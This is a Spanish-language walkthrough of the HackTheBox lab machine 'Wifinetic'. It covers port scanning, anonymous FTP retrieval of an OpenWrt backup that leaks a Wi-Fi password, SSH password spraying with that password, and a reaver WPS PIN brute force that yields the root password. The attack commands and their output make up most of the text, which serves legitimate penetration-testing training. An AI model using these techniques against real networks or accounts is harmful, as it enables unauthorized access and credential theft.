---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Wifinetic

Wifinetic es una máquina Linux de dificultad fácil que presenta un desafío de red intrigante, centrándose en la seguridad inalámbrica y la monitorización de la red. Un servicio FTP expuesto tiene habilitada la autenticación anónima que nos permite descargar los archivos disponibles. Uno de los archivos es una copia de seguridad de OpenWRT que contiene la configuración de la red inalámbrica que revela una contraseña del punto de acceso.

El contenido de los archivos shadow o passwd revela además los nombres de usuario en el servidor. Con esta información, se puede llevar a cabo un ataque de reutilización de contraseñas en el servicio SSH, lo que nos permite obtener un punto de apoyo como usuario netadmin.

Usando herramientas estándar y con la interfaz inalámbrica proporcionada en modo de monitorización, podemos forzar brutamente el PIN WPS para el punto de acceso para obtener la clave precompartida (PSK). La frase de contraseña se puede reutilizar en el servicio SSH para obtener acceso root en el servidor.

<figure><img src="../../.gitbook/assets/Wifinetic.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Wifinetic**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.247 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 13:51 CET
Initiating SYN Stealth Scan at 13:51
Scanning 10.10.11.247 [65535 ports]
Discovered open port 22/tcp on 10.10.11.247
Discovered open port 53/tcp on 10.10.11.247
Discovered open port 21/tcp on 10.10.11.247
Completed SYN Stealth Scan at 13:52, 20.50s elapsed (65535 total ports)
Nmap scan report for 10.10.11.247
Host is up, received user-set (0.070s latency).
Scanned at 2025-01-26 13:51:56 CET for 21s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
           Raw packets sent: 66129 (2.910MB) | Rcvd: 65845 (2.634MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.247
	[*] Open ports: 21,22,53

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado comprobamos que se encuentran abiertos el servicio SSH y FTP.

```bash
❯ nmap -sCV -p21,22,53 10.10.11.247 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 13:52 CET
Nmap scan report for 10.10.11.247
Host is up (0.070s latency).

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   88.87 ms 10.10.16.1
2   30.06 ms 10.10.11.247

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (277).png" alt=""><figcaption></figcaption></figure>

## FTP Enumeration

Accederemos al FTP autenticándonos con el usuario `anonymous` que en el escaneo con **Nmap** comprobamos que podíamos acceder. Al revisar el contenido del FTP, nos encontramos con varios archivos los cuales nos descargaremos en nuestro equipo local.

```bash
❯ ftp 10.10.11.247
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
Name (10.10.11.247:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48936|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
226 Directory send OK.
ftp> mget *
```

## Initial Access

### Information Leakage

Una vez descargado los archivos, nos montaremos un servidor web para visualizar el contenido de destos archivos a través del navegador.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

En estos primeros archivos, no visualizamos ninguna información de suma importancia. Lo único destacable que podemos sacar es el nombre del usuario `samantha.wood93@wifinetic.htb`.

<figure><img src="../../.gitbook/assets/imagen (281).png" alt=""><figcaption></figcaption></figure>

Revisando los otros dos documentos que teníamos, solamente logramos sacar un nombre más de `olivia.walker17@wifinetic.htb`.

<figure><img src="../../.gitbook/assets/4148_vmware_P4kpQxjBUu.png" alt=""><figcaption></figcaption></figure>

También disponemos de un compromido llamado `backup-OpenWrt-2023-07-26.tar`. Descomprimiremos el archivo para visualizar el contenido que tiene el archivo. Revisando la estructura, parecen haber varios archivos de configuración y documentación interesante que deberemos investigar.

```bash
❯ ls -l backup-OpenWrt-2023-07-26.tar
.rw-rw-r-- kali kali 40 KB Mon Sep 11 17:25:00 2023  backup-OpenWrt-2023-07-26.tar
❯ tar -xf backup-OpenWrt-2023-07-26.tar
❯ tree
.
├── backup-OpenWrt-2023-07-26.tar
└── etc
    ├── config
    │   ├── dhcp
    │   ├── dropbear
    │   ├── firewall
    │   ├── luci
    │   ├── network
    │   ├── rpcd
    │   ├── system
    │   ├── ucitrack
    │   ├── uhttpd
    │   └── wireless
    ├── dropbear
    │   ├── dropbear_ed25519_host_key
    │   └── dropbear_rsa_host_key
    ├── group
    ├── hosts
    ├── inittab
    ├── luci-uploads
    ├── nftables.d
    │   ├── 10-custom-filter-chains.nft
    │   └── README
    ├── opkg
    │   └── keys
    │       └── 4d017e6f1ed5d616
    ├── passwd
    ├── profile
    ├── rc.local
    ├── shells
    ├── shinit
    ├── sysctl.conf
    ├── uhttpd.crt
    └── uhttpd.key

8 directories, 27 files
```

Por un lado disponemos de un archivo llamado `passwd` el cual contiene nombres de uusarios. Estos usuarios nos lo guardaremos en un archivo `users.txt` para disponer de un listado de posibles usuarios.

```bash
❯ cat passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

Revisandon los diferentes archivos de configuración, nos encontramos con el siguiente archivo en la siguiente ruta `etc/config/wireless` el cual contiene configuración de dispositivos Wireless. Entre la configuración nos aparece una contraseña.

```bash
❯ cat wireless

config wifi-device 'radio0'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim0'
	option cell_density '0'
	option channel 'auto'
	option band '2g'
	option txpower '20'

config wifi-device 'radio1'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim1'
	option channel '36'
	option band '5g'
	option htmode 'HE80'
	option cell_density '0'

config wifi-iface 'wifinet0'
	option device 'radio0'
	option mode 'ap'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
	option wps_pushbutton '1'

config wifi-iface 'wifinet1'
	option device 'radio1'
	option mode 'sta'
	option network 'wwan'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
```

Probaremos de validar si estas credenciales sirven para algún usuario de los que disponemos. Verificamos que el usuario `netadmin` sí son válidas para acceder al SSH.

```bash
❯ nxc ssh 10.10.11.247 -u users.txt -p 'VeRyUniUqWiFIPasswrd1!' --continue-on-success
SSH         10.10.11.247    22     10.10.11.247     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.11.247    22     10.10.11.247     [-] root:VeRyUniUqWiFIPasswrd1!
SSH         10.10.11.247    22     10.10.11.247     [-] daemon:VeRyUniUqWiFIPasswrd1!
SSH         10.10.11.247    22     10.10.11.247     [-] ftp:VeRyUniUqWiFIPasswrd1!
SSH         10.10.11.247    22     10.10.11.247     [-] network:VeRyUniUqWiFIPasswrd1!
SSH         10.10.11.247    22     10.10.11.247     [-] nobody:VeRyUniUqWiFIPasswrd1!
SSH         10.10.11.247    22     10.10.11.247     [-] ntp:VeRyUniUqWiFIPasswrd1!
SSH         10.10.11.247    22     10.10.11.247     [-] dnsmasq:VeRyUniUqWiFIPasswrd1!
SSH         10.10.11.247    22     10.10.11.247     [-] logd:VeRyUniUqWiFIPasswrd1!
SSH         10.10.11.247    22     10.10.11.247     [-] ubus:VeRyUniUqWiFIPasswrd1!
SSH         10.10.11.247    22     10.10.11.247     [+] netadmin:VeRyUniUqWiFIPasswrd1!  Linux - Shell access!
```

Comprobamos que podemos acceder correctamente al SSH y visualizar la flag de **user.txt**.

```bash
❯ ssh netadmin@10.10.11.247
netadmin@10.10.11.247's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

...[snip]...

netadmin@wifinetic:~$ cat user.txt
e86c726cda4********************
```

## Privilege Escalation

### Abusing an AP's WPS to get the root password (reaver)

Revisando al usuario `netadmin` el cual disponemos de acceso, comprobamos que dispone de una `capabilitie` de `reaver`.

{% hint style="info" %}
**Reaver** es una herramienta de fuerza bruta diseñada para recuperar la contraseña **WPA/WPA2** de una red Wi-Fi aprovechando vulnerabilidades en la implementación de **WPS (Wi-Fi Protected Setup)**. Es útil cuando el WPS está habilitado en el router, ya que permite a los atacantes explotar este protocolo para acceder a la red inalámbrica sin necesidad de capturar tráfico.
{% endhint %}

```bash
netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep

netadmin@wifinetic:~$ which reaver | xargs ls -l
-rwxr-xr-x 1 root root 818808 May 17  2018 /usr/bin/reaver
```

Revisamos que efectivamente podemos ejecutar el binario de `reaver` sin problemas.

```bash
netadmin@wifinetic:~$ reaver

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

Required Arguments:
	-i, --interface=<wlan>          Name of the monitor-mode interface to use
	-b, --bssid=<mac>               BSSID of the target AP

Optional Arguments:
	-m, --mac=<mac>                 MAC of the host system
	-e, --essid=<ssid>              ESSID of the target AP
	-c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)
	-s, --session=<file>            Restore a previous session file
	-C, --exec=<command>            Execute the supplied command upon successful pin recovery
	-f, --fixed                     Disable channel hopping
	-5, --5ghz                      Use 5GHz 802.11 channels
	-v, --verbose                   Display non-critical warnings (-vv or -vvv for more)
	-q, --quiet                     Only display critical messages
	-h, --help                      Show help

Advanced Options:
	-p, --pin=<wps pin>             Use the specified pin (may be arbitrary string or 4/8 digit WPS pin)
	-d, --delay=<seconds>           Set the delay between pin attempts [1]
	-l, --lock-delay=<seconds>      Set the time to wait if the AP locks WPS pin attempts [60]
	-g, --max-attempts=<num>        Quit after num pin attempts
	-x, --fail-wait=<seconds>       Set the time to sleep after 10 unexpected failures [0]
	-r, --recurring-delay=<x:y>     Sleep for y seconds every x pin attempts
	-t, --timeout=<seconds>         Set the receive timeout period [10]
	-T, --m57-timeout=<seconds>     Set the M5/M7 timeout period [0.40]
	-A, --no-associate              Do not associate with the AP (association must be done by another application)
	-N, --no-nacks                  Do not send NACK messages when out of order packets are received
	-S, --dh-small                  Use small DH keys to improve crack speed
	-L, --ignore-locks              Ignore locked state reported by the target AP
	-E, --eap-terminate             Terminate each WPS session with an EAP FAIL packet
	-J, --timeout-is-nack           Treat timeout as NACK (DIR-300/320)
	-F, --ignore-fcs                Ignore frame checksum errors
	-w, --win7                      Mimic a Windows 7 registrar [False]
	-K, --pixie-dust                Run pixiedust attack
	-Z                              Run pixiedust attack

Example:
	reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv
```

Revisamos las interfaces de red que disponía el equipo y comprobamos que hay una llamada `mon0` que parece ser de monitorización por el nombre.

```bash
netadmin@wifinetic:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:fe94:406a  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:fe94:406a  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:94:40:6a  txqueuelen 1000  (Ethernet)
        RX packets 68362  bytes 4151090 (4.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 67783  bytes 6393997 (6.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 240  bytes 14400 (14.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 240  bytes 14400 (14.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 8638  bytes 1531265 (1.5 MB)
        RX errors 0  dropped 8638  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 174  bytes 19332 (19.3 KB)
        RX errors 0  dropped 41  overruns 0  frame 0
        TX packets 247  bytes 31992 (31.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 106  bytes 14016 (14.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 174  bytes 22464 (22.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

El comando iw dev en Linux se utiliza para mostrar las interfaces inalámbricas disponibles en tu sistema y la información asociada a ellas. Entre la información recopilada, nos encontramos que hay una interfaz que actúa como AP (wlan0) y otra como cliente (wlan1)

```bash
netadmin@wifinetic:~$ iw dev
phy#2
	Interface mon0
		ifindex 7
		wdev 0x200000002
		addr 02:00:00:00:02:00
		type monitor
		txpower 20.00 dBm
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		type managed
		txpower 20.00 dBm
phy#1
	Unnamed/non-netdev interface
		wdev 0x100000018
		addr 42:00:00:00:01:00
		type P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		type managed
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr 02:00:00:00:00:00
		ssid OpenWrt
		type AP
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
```

A través de `reaver` realizaremos un ataque de fuerza bruta sobre el AP para encontrar la contraseña WPA/WPA2 del AP. Verificamos que hemos logrado obtener la contraseña del AP.

```bash
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
...[snip]...
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 6 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

Probaremos de acceder con estas nuevas credenciales al usuario `root` y comprobamos que podemos acceder y visualizar la flag de **root.txt**.

```bash
netadmin@wifinetic:~$ su root
Password: 
root@wifinetic:/home/netadmin# cat /root/root.txt
935bf498ebd89********************
```
